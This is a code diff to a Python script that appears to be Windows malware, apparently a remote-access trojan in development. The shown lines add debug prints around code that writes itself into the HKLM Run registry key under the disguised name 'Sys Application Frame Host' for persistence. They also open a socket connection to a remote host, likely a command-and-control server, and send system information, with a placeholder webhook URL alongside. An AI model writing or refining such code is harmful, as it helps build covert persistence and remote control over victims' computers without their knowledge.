@@ -19,14 +19,16 @@ import winreg
 
 WEBHOOK_URL = "&WEBHOOK_URL&"
 
+print("started")
+
 script_path = os.path.abspath(sys.argv[0])
 
-#current vs local
 try:
     reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
     reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
     winreg.SetValueEx(reg_key, "Sys Application Frame Host", 0, winreg.REG_SZ, script_path)
     winreg.CloseKey(reg_key)
+    print("reg")
 except Exception:
     pass
 
@@ -149,7 +151,9 @@ while True:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             HOST = get_ip(url)
+            print("connect")
             client_socket.connect((HOST, PORT))
+            print("connected")
             getinfos() 
             connected = True
             
